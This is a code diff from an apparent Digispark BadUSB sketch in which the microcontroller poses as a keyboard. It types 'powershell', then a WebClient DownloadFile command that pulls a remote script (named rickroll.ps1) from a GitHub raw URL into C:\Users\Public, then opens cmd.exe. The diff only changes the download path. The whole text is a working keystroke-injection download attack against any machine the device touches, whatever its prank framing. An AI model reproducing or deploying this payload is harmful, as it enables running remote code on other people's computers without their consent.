@@ -12,7 +12,7 @@ void loop() {
   DigiKeyboard.print("powershell");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(500);
-  DigiKeyboard.print("(New-Object System.Net.WebClient).DownloadFile(\"https://raw.githubusercontent.com/ShiroNexo/test/main/rickroll.ps1\", \"C:\\Users\\Public\\rickroll.ps1\")");
+  DigiKeyboard.print("(New-Object System.Net.WebClient).DownloadFile(\"https://raw.githubusercontent.com/ShiroNexo/test/main/RickRoll_Schedule/rickroll.ps1\", \"C:\\Users\\Public\\rickroll.ps1\")");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(2000);
   DigiKeyboard.print("cmd.exe");
